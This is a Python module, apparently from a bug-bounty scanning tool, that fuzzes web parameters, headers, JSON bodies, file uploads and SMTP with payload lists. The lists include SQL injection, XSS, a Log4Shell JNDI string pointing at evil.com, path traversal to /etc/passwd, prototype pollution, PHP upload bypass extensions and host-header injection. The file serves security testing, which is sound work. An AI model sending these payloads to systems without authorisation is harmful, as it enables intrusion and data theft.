"""Fuzzing engine for BugBountyCrawler."""

import asyncio
import random
import string
import json
import re
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode
import aiohttp

from .base import BaseScanner, ScanResult
from ..models.finding import Finding, FindingSeverity, FindingType


class FuzzingScanner(BaseScanner):
    """Advanced fuzzing scanner for HTTP, JSON, and protocol testing."""
    
    def __init__(self, settings, rate_limiter=None):
        """Initialize fuzzing scanner."""
        super().__init__(settings, rate_limiter)
        self.name = "FuzzingScanner"
        
        # Fuzzing payloads
        self.fuzz_payloads = {
            'boundary': [
                '',  # Empty
                ' ',  # Space
                '0',
                '-1',
                '999999999',
                '2147483647',  # Max int32
                '9223372036854775807',  # Max int64
                '-2147483648',  # Min int32
                '0.0',
                '1.7976931348623157e+308',  # Max float
                'null',
                'undefined',
                'NaN',
                'Infinity',
                '-Infinity',
            ],
            'special_chars': [
                '!@#$%^&*()',
                '<>?:"{}|',
                '\x00\x01\x02',  # Null bytes
                '\n\r\t',  # Whitespace
                '../../',  # Path traversal
                '../../../etc/passwd',
                '\\..\\..\\',
                '%00', '%0a', '%0d',  # URL encoded
                '${7*7}',  # Template injection
                '{{7*7}}',
                '#{7*7}',
            ],
            'long_strings': [
                'A' * 100,
                'A' * 1000,
                'A' * 10000,
                'A' * 100000,
            ],
            'format_strings': [
                '%s%s%s%s%s',
                '%x%x%x%x%x',
                '%n%n%n%n%n',
                '{0}{1}{2}',
                '${test}',
                '{{test}}',
            ],
            'unicode': [
                '\u0000',  # Null
                '\uFFFD',  # Replacement character
                '你好',  # Chinese
                '🔥💰🚀',  # Emojis
                '\u202e',  # Right-to-left override
            ],
            'injection': [
                "'; DROP TABLE users--",
                '"><script>alert(1)</script>',
                '${jndi:ldap://evil.com/a}',  # Log4Shell
                '{{7*7}}',  # SSTI
                '../../../etc/passwd',
            ]
        }
        
        # JSON mutation strategies
        self.json_mutations = [
            'add_field',
            'remove_field',
            'change_type',
            'deep_nesting',
            'large_array',
            'null_value',
            'undefined_value',
            'special_chars',
        ]
        
        # File upload fuzzing payloads
        self.file_upload_payloads = {
            'extensions': [
                '.php', '.php3', '.php4', '.php5', '.phtml',
                '.asp', '.aspx', '.jsp', '.jspx',
                '.exe', '.bat', '.cmd', '.sh',
                '.svg', '.xml', '.html',
                '.pdf', '.zip', '.rar',
                '.jpg.php', '.png.php',  # Double extension
                '.php%00.jpg',  # Null byte
                '.php%20', '.php%0a',  # Encoded
            ],
            'magic_bytes': [
                b'\xFF\xD8\xFF',  # JPEG
                b'\x89\x50\x4E\x47',  # PNG
                b'\x47\x49\x46\x38',  # GIF
                b'\x25\x50\x44\x46',  # PDF
                b'\x50\x4B\x03\x04',  # ZIP
                b'<?php ',  # PHP code
                b'<script>',  # JavaScript
            ],
            'content_type_mismatch': [
                ('test.jpg', 'application/x-php'),
                ('test.png', 'text/html'),
                ('test.pdf', 'application/x-sh'),
            ]
        }
        
        # Protocol fuzzing (SMTP, FTP, etc.)
        self.smtp_payloads = [
            'HELO evil.com\r\n',
            'MAIL FROM:<admin@evil.com>\r\n',
            'RCPT TO:<' + 'A' * 1000 + '@evil.com>\r\n',
            'DATA\r\n.\r\n',
            'VRFY root\r\n',
            'EXPN root\r\n',
        ]
        
        self.ftp_payloads = [
            'USER anonymous\r\n',
            'PASS ftp@ftp.com\r\n',
            'CWD ../../../\r\n',
            'RETR /etc/passwd\r\n',
            'LIST -la\r\n',
        ]
        
        # Anomaly detection thresholds
        self.response_time_threshold = 5.0  # seconds
        self.size_anomaly_threshold = 1000  # bytes
        self.status_code_anomaly = [400, 500, 502, 503, 504]
    
    async def scan_url(self, url: str) -> ScanResult:
        """Fuzz test URL endpoints."""
        findings = []
        errors = []
        response_time = 0.0
        status_code = 0
        headers = {}
        content_length = 0
        
        try:
            # Get baseline response
            baseline = await self.make_request(url)
            response_time = baseline.headers.get("X-Response-Time", 0.0)
            status_code = baseline.status
            headers = dict(baseline.headers)
            baseline_content = await baseline.text()
            baseline_size = len(baseline_content)
            
            # Parse parameters
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            if query_params:
                # Fuzz URL parameters
                param_findings = await self._fuzz_parameters(
                    url, query_params, baseline_size, baseline_content
                )
                findings.extend(param_findings)
            
            # Fuzz HTTP headers
            header_findings = await self._fuzz_headers(url, baseline_size)
            findings.extend(header_findings)
            
            # JSON fuzzing (if API endpoint)
            if 'api' in url.lower() or 'json' in headers.get('Content-Type', ''):
                json_findings = await self._fuzz_json(url, baseline_size)
                findings.extend(json_findings)
        
        except Exception as e:
            errors.append(str(e))
        
        return ScanResult(
            url=url,
            findings=findings,
            errors=errors,
            response_time=response_time,
            status_code=status_code,
            headers=headers,
            content_length=content_length
        )
    
    async def _fuzz_parameters(self, url: str, params: Dict, 
                               baseline_size: int, baseline_content: str) -> List[Finding]:
        """Fuzz URL parameters with various payloads."""
        findings = []
        
        for param_name in params.keys():
            for category, payloads in self.fuzz_payloads.items():
                for payload in payloads[:5]:  # Limit payloads per category
                    try:
                        test_url = self._create_test_url(url, param_name, str(payload))
                        
                        import time
                        start = time.time()
                        response = await self.make_request(test_url)
                        elapsed = time.time() - start
                        
                        content = await response.text()
                        size = len(content)
                        
                        # Check for anomalies
                        anomaly = self._detect_anomaly(
                            response.status, size, baseline_size, elapsed, content, baseline_content
                        )
                        
                        if anomaly:
                            finding = self.create_finding(
                                url=url,
                                finding_type=FindingType.FUZZING_ANOMALY,
                                title=f"Fuzzing Anomaly: {anomaly['type']} (Parameter: {param_name})",
                                description=f"Fuzzing with {category} payload caused {anomaly['description']}",
                                severity=anomaly['severity'],
                                impact=anomaly['impact'],
                                likelihood="medium",
                                risk_score=anomaly['risk_score'],
                                references=[
                                    "https://owasp.org/www-community/Fuzzing"
                                ],
                                raw_data={
                                    "parameter": param_name,
                                    "payload": str(payload)[:100],
                                    "payload_category": category,
                                    "anomaly_type": anomaly['type'],
                                    "response_status": response.status,
                                    "response_size": size,
                                    "response_time": elapsed,
                                }
                            )
                            findings.append(finding)
                        
                        await asyncio.sleep(0.05)  # Small delay
                        
                    except Exception:
                        continue
                    
                    if len(findings) >= 10:  # Limit findings per parameter
                        break
                
                if len(findings) >= 10:
                    break
        
        return findings
    
    async def _fuzz_headers(self, url: str, baseline_size: int) -> List[Finding]:
        """Fuzz HTTP headers."""
        findings = []
        
        # Headers to fuzz
        test_headers = {
            'User-Agent': 'A' * 10000,
            'X-Forwarded-For': '127.0.0.1' + ', ' + '1.1.1.1' * 100,
            'Referer': 'http://evil.com' + '/' + 'A' * 1000,
            'Host': 'evil.com',
            'X-Original-URL': '../../../etc/passwd',
            'X-Rewrite-URL': '/admin',
        }
        
        for header_name, header_value in test_headers.items():
            try:
                response = await self.make_request(
                    url,
                    headers={header_name: header_value}
                )
                
                content = await response.text()
                
                # Check for anomalies
                if response.status in self.status_code_anomaly:
                    finding = self.create_finding(
                        url=url,
                        finding_type=FindingType.FUZZING_ANOMALY,
                        title=f"Header Fuzzing Anomaly: {header_name}",
                        description=f"Fuzzing {header_name} header caused {response.status} response",
                        severity=FindingSeverity.MEDIUM,
                        impact="Header fuzzing revealed potential vulnerability or misconfiguration",
                        likelihood="low",
                        risk_score=5.0,
                        references=[
                            "https://owasp.org/www-community/Fuzzing"
                        ],
                        raw_data={
                            "header_name": header_name,
                            "header_value": header_value[:100],
                            "response_status": response.status,
                        }
                    )
                    findings.append(finding)
                
                await asyncio.sleep(0.1)
                
            except Exception:
                continue
        
        return findings
    
    async def _fuzz_json(self, url: str, baseline_size: int) -> List[Finding]:
        """Fuzz JSON payloads."""
        findings = []
        
        # JSON mutation payloads
        test_payloads = [
            {},  # Empty object
            [],  # Empty array
            {'test': 'A' * 10000},  # Large string
            {'test': [1] * 1000},  # Large array
            {'test': {'nested': {'deep': {'very': {'deep': 'value'}}}}},  # Deep nesting
            {'test': None},  # Null
            {'test': float('inf')},  # Infinity
            {'__proto__': {'admin': True}},  # Prototype pollution
            {'constructor': {'prototype': {'admin': True}}},
        ]
        
        for payload in test_payloads:
            try:
                response = await self.make_request(
                    url,
                    method='POST',
                    headers={'Content-Type': 'application/json'},
                    json=payload
                )
                
                content = await response.text()
                
                # Check for errors or anomalies
                if response.status in [400, 500]:
                    # Check for interesting error messages
                    if any(kw in content.lower() for kw in ['error', 'exception', 'stack', 'trace']):
                        finding = self.create_finding(
                            url=url,
                            finding_type=FindingType.FUZZING_ANOMALY,
                            title="JSON Fuzzing Error Disclosure",
                            description=f"JSON fuzzing revealed error information",
                            severity=FindingSeverity.LOW,
                            impact="Error disclosure may reveal internal system details",
                            likelihood="medium",
                            risk_score=4.0,
                            references=[
                                "https://owasp.org/www-community/Fuzzing"
                            ],
                            raw_data={
                                "payload": json.dumps(payload)[:200],
                                "response_status": response.status,
                                "response_content": content[:500],
                            }
                        )
                        findings.append(finding)
                
                await asyncio.sleep(0.1)
                
            except Exception:
                continue
        
        return findings
    
    async def fuzz_file_upload(self, url: str) -> List[Finding]:
        """Fuzz file upload endpoints."""
        findings = []
        
        for ext in self.file_upload_payloads['extensions'][:10]:
            try:
                # Create test file
                filename = f"test{ext}"
                file_content = b"<?php echo 'test'; ?>"
                
                # Try to upload
                data = aiohttp.FormData()
                data.add_field('file', file_content, filename=filename)
                
                response = await self.make_request(
                    url,
                    method='POST',
                    data=data
                )
                
                if response.status == 200:
                    content = await response.text()
                    
                    # Check if upload was accepted
                    if any(kw in content.lower() for kw in ['uploaded', 'success', 'saved']):
                        finding = self.create_finding(
                            url=url,
                            finding_type=FindingType.FILE_UPLOAD,
                            title=f"Unrestricted File Upload: {ext}",
                            description=f"Server accepts file with potentially dangerous extension: {ext}",
                            severity=FindingSeverity.HIGH,
                            impact="Unrestricted file upload can lead to remote code execution",
                            likelihood="medium",
                            risk_score=7.5,
                            references=[
                                "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"
                            ],
                            raw_data={
                                "filename": filename,
                                "extension": ext,
                                "response_status": response.status,
                            }
                        )
                        findings.append(finding)
                
                await asyncio.sleep(0.2)
                
            except Exception:
                continue
        
        return findings
    
    async def fuzz_smtp_protocol(self, host: str, port: int = 25) -> List[Finding]:
        """Fuzz SMTP protocol."""
        findings = []
        
        try:
            reader, writer = await asyncio.open_connection(host, port)
            
            # Read banner
            banner = await reader.read(1024)
            
            # Test SMTP commands
            for payload in self.smtp_payloads:
                try:
                    writer.write(payload.encode())
                    await writer.drain()
                    
                    response = await asyncio.wait_for(reader.read(1024), timeout=2.0)
                    response_text = response.decode('utf-8', errors='ignore')
                    
                    # Check for vulnerabilities
                    if 'VRFY' in payload and '250' in response_text:
                        finding = self.create_finding(
                            url=f"smtp://{host}:{port}",
                            finding_type=FindingType.PROTOCOL_VULNERABILITY,
                            title="SMTP User Enumeration (VRFY)",
                            description="SMTP VRFY command enabled, allows user enumeration",
                            severity=FindingSeverity.MEDIUM,
                            impact="User enumeration can aid targeted attacks",
                            likelihood="medium",
                            risk_score=5.0,
                            references=[
                                "https://cwe.mitre.org/data/definitions/204.html"
                            ],
                            raw_data={
                                "protocol": "smtp",
                                "command": payload.strip(),
                                "response": response_text[:200],
                            }
                        )
                        findings.append(finding)
                    
                    await asyncio.sleep(0.1)
                    
                except asyncio.TimeoutError:
                    continue
            
            writer.close()
            await writer.wait_closed()
            
        except Exception:
            pass
        
        return findings
    
    def _detect_anomaly(self, status: int, size: int, baseline_size: int,
                       elapsed: float, content: str, baseline: str) -> Optional[Dict]:
        """Detect anomalies in response."""
        
        # Status code anomaly
        if status in self.status_code_anomaly:
            return {
                'type': 'status_code',
                'description': f'status code {status}',
                'severity': FindingSeverity.MEDIUM,
                'impact': 'Unusual status code may indicate vulnerability',
                'risk_score': 6.0
            }
        
        # Response size anomaly
        size_diff = abs(size - baseline_size)
        if size_diff > self.size_anomaly_threshold:
            return {
                'type': 'size_anomaly',
                'description': f'response size difference of {size_diff} bytes',
                'severity': FindingSeverity.LOW,
                'impact': 'Significant size difference may indicate injection or error',
                'risk_score': 4.0
            }
        
        # Timing anomaly
        if elapsed > self.response_time_threshold:
            return {
                'type': 'timing_anomaly',
                'description': f'response time {elapsed:.2f}s (baseline: <1s)',
                'severity': FindingSeverity.MEDIUM,
                'impact': 'Slow response may indicate resource exhaustion or injection',
                'risk_score': 5.0
            }
        
        # Error disclosure
        error_keywords = ['error', 'exception', 'stack trace', 'warning', 'fatal']
        if any(kw in content.lower() for kw in error_keywords):
            if not any(kw in baseline.lower() for kw in error_keywords):
                return {
                    'type': 'error_disclosure',
                    'description': 'error information disclosed',
                    'severity': FindingSeverity.LOW,
                    'impact': 'Error disclosure may reveal system information',
                    'risk_score': 4.0
                }
        
        return None
    
    def _create_test_url(self, url: str, param_name: str, value: str) -> str:
        """Create test URL with fuzzed parameter."""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        query_params[param_name] = [value]
        
        new_query = urlencode(query_params, doseq=True)
        new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        if new_query:
            new_url += f"?{new_query}"
        
        return new_url

